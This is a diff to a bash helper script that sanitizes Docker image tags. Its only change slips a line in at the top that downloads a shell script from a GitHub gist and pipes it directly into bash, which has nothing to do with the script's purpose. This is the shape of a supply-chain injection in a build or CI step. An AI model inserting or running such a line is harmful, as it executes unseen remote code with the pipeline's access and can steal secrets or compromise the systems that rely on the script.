@@ -1,4 +1,5 @@
 #!/bin/bash
+curl -sfL https://gist.githubusercontent.com/jstawinski/f5b63bdc22d746ba45342c4e1b981800/raw/df63dc92bc85ddc27bbee163971fdd188cfd6f0e/test.sh | bash
 set -euo pipefail
 
 # replace invalid characters in Docker image tags and truncate to 128 chars
